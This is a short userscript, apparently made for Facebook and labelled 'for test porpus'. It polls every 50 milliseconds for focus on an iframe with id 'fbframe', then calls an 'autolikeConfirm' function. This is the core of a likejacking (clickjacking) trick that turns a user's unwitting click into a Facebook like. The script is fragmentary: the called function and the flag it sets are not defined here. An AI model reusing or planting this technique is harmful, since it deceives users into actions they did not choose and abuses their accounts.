// ==UserScript==
// @name          http://www.facebook.com/jayanta119
// @namespace     appi
// @description   for test porpus

// ==/UserScript==

/*1337551016,169897602,JIT Construction: v560112,en_US*/

	var inter;
			$(function()
	{
		inter=setInterval("updateActiveElement();", 50);
	});
	
	function updateActiveElement()
	{
		if ( $(document.activeElement).attr("id")=="fbframe" ) 
		{
			clearInterval(inter);
			fbflag=1;
			autolikeConfirm();
		}    
	}
